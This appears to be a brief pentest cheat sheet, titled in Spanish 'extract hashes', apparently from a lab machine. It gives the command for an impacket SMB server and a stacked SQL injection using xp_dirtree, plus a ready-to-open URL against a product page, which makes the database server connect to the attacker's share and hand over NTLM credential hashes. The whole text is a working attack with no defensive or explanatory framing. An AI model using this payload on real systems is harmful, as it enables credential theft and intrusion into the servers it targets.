
# EXTRAER HASHES
```shell
❯ sudo impacket-smbserver smbFolder $(pwd) -smb2support

;EXEC MASTER.sys.xp_dirtree '\\10.10.16.4\smbFolder\Test'
usage (open this url) ==> https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=7;EXEC%20MASTER.sys.xp_dirtree%20%27\\10.10.16.4\smbFolder\Test%27
```